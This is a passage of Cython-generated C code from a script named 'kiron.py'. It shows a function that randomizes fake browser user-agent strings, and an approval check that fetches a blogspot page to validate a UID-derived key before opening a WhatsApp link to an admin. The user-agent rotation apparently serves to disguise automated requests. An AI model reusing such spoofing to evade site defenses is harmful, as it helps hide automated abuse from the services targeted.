  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 9, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_Safari);
  __pyx_t_6 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_Safari);
  PyTuple_SET_ITEM(__pyx_t_2, 10, __pyx_kp_u_Safari);
  __Pyx_INCREF(__pyx_v_cz);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_cz) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_cz) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_cz);
  __Pyx_GIVEREF(__pyx_v_cz);
  PyTuple_SET_ITEM(__pyx_t_2, 11, __pyx_v_cz);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_2, 12, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_C = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  /* "kiron.py":153
 *     cz=f"5{cx}.{cV}"
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
 *     D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"             # <<<<<<<<<<<<<<
 *     return random.choice([A,B,C,D])
 * #-------------------// APPROVAL \\---------------------#
 */
  __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6);
  __pyx_t_6 += 94;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_3};
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 153, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_0_Safari_537_36);
  __pyx_t_6 += 16;
  __Pyx_GIVEREF(__pyx_kp_u_0_Safari_537_36);
  PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_0_Safari_537_36);
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 153, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_D = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  /* "kiron.py":154
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
 *     D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
 *     return random.choice([A,B,C,D])             # <<<<<<<<<<<<<<
 * #-------------------// APPROVAL \\---------------------#
 * import os,httpx
 */
  __Pyx_XDECREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 154, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyList_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v_A);
  __Pyx_GIVEREF(__pyx_v_A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_A)) __PYX_ERR(0, 154, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_B);
  __Pyx_GIVEREF(__pyx_v_B);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 1, __pyx_v_B)) __PYX_ERR(0, 154, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_C);
  __Pyx_GIVEREF(__pyx_v_C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 2, __pyx_v_C)) __PYX_ERR(0, 154, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_D);
  __Pyx_GIVEREF(__pyx_v_D);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 3, __pyx_v_D)) __PYX_ERR(0, 154, __pyx_L1_error);
  __pyx_t_3 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_4};
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 154, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_r = __pyx_t_2;
  __pyx_t_2 = 0;
  goto __pyx_L0;

  /* "kiron.py":142
 * #-----------------------[ UA-CODE ]-----------------------#
 * #old ua def[]
 * def windows():             # <<<<<<<<<<<<<<
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 */

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("kiron.windows", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_aV);
  __Pyx_XDECREF(__pyx_v_A);
  __Pyx_XDECREF(__pyx_v_bV);
  __Pyx_XDECREF(__pyx_v_bx);
  __Pyx_XDECREF(__pyx_v_bz);
  __Pyx_XDECREF(__pyx_v_B);
  __Pyx_XDECREF(__pyx_v_cV);
  __Pyx_XDECREF(__pyx_v_cx);
  __Pyx_XDECREF(__pyx_v_cz);
  __Pyx_XDECREF(__pyx_v_C);
  __Pyx_XDECREF(__pyx_v_D);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":158
 * import os,httpx
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():             # <<<<<<<<<<<<<<
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_13approval(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_13approval = {"approval", (PyCFunction)__pyx_pw_5kiron_13approval, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_13approval(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("approval (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_12approval(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_12approval(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_sexkey = NULL;
  PyObject *__pyx_v_ress = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_tks = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("approval", 1);

  /* "kiron.py":159
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"             # <<<<<<<<<<<<<<
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 *     if sexkey in ress:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_getuid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_kp_s_XD, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_4YYU8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_getuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_XD_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_sexkey = __pyx_t_5;
  __pyx_t_5 = 0;

  /* "kiron.py":160
 * def approval():
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text             # <<<<<<<<<<<<<<
 *     if sexkey in ress:
 *         menu()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_httpx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_1, __pyx_kp_s_https_fgsrsvb_blogspot_com_2024};
    __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 160, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_ress = __pyx_t_3;
  __pyx_t_3 = 0;

  /* "kiron.py":161
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 *     if sexkey in ress:             # <<<<<<<<<<<<<<
 *         menu()
 *     else:
 */
  __pyx_t_6 = (__Pyx_PySequence_ContainsTF(__pyx_v_sexkey, __pyx_v_ress, Py_EQ)); if (unlikely((__pyx_t_6 < 0))) __PYX_ERR(0, 161, __pyx_L1_error)
  if (__pyx_t_6) {

    /* "kiron.py":162
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 *     if sexkey in ress:
 *         menu()             # <<<<<<<<<<<<<<
 *     else:
 *         print("\x1b[38;5;244m KEY IS NOT APPROVED")
 */
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_menu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 162, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_1 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_1, NULL};
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 162, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":161
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 *     if sexkey in ress:             # <<<<<<<<<<<<<<
 *         menu()
 *     else:
 */
    goto __pyx_L3;
  }

  /* "kiron.py":164
 *         menu()
 *     else:
 *         print("\x1b[38;5;244m KEY IS NOT APPROVED")             # <<<<<<<<<<<<<<
 *         os.system("clear")
 *         print(logo)
 */
  /*else*/ {
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 164, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":165
 *     else:
 *         print("\x1b[38;5;244m KEY IS NOT APPROVED")
 *         os.system("clear")             # <<<<<<<<<<<<<<
 *         print(logo)
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 */
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 165, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 165, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_n_s_clear};
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 165, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":166
 *         print("\x1b[38;5;244m KEY IS NOT APPROVED")
 *         os.system("clear")
 *         print(logo)             # <<<<<<<<<<<<<<
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 *         print('\x1b[1;97m\033[1;37m')
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_logo); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 166, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 166, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":167
 *         os.system("clear")
 *         print(logo)
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")             # <<<<<<<<<<<<<<
 *         print('\x1b[1;97m\033[1;37m')
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 */
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 167, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":168
 *         print(logo)
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 *         print('\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 *         time.sleep(2)
 */
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 168, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":169
 *         print("\x1b[1;97m\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m YOUR KEY IS NOT APPROVED ")
 *         print('\x1b[1;97m\033[1;37m')
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')             # <<<<<<<<<<<<<<
 *         time.sleep(2)
 *         tks = sexkey
 */
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 169, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":170
 *         print('\x1b[1;97m\033[1;37m')
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 *         time.sleep(2)             # <<<<<<<<<<<<<<
 *         tks = sexkey
 *         os.system('xdg-open https://wa.me/+8801909765573')
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 170, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 170, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
